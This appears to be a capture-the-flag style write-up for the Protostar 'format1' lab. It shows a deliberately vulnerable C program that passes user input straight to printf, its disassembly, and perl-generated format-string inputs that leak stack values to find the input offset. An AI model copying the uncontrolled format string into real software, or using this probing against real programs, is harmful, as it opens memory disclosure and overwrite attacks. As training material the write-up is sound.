#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
    printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}

0x080483f4 <vuln+0>:    push   %ebp
0x080483f5 <vuln+1>:    mov    %esp,%ebp
0x080483f7 <vuln+3>:    sub    $0x18,%esp
0x080483fa <vuln+6>:    mov    0x8(%ebp),%eax
0x080483fd <vuln+9>:    mov    %eax,(%esp)
0x08048400 <vuln+12>:   call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:   mov    0x8049638,%eax
0x0804840a <vuln+22>:   test   %eax,%eax
0x0804840c <vuln+24>:   je     0x804841a <vuln+38>
0x0804840e <vuln+26>:   movl   $0x8048500,(%esp)
0x08048415 <vuln+33>:   call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:   leave  
0x0804841b <vuln+39>:   ret    



user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target


user@protostar:/opt/protostar/bin$ ./format1 $(perl -e 'print "AAAA"."[%08x]"x(132)') 
AAAA[0804960c][bffff448][08048469].......[3174616d][41414100]

注意最后一个00，表明还需要对齐
user@protostar:/opt/protostar/bin$ ./format1 $(perl -e 'print "AAAAB"."[%08x]"x(132)') 
AAAAB[0804960c][bffff448]......[00317461][41414141]

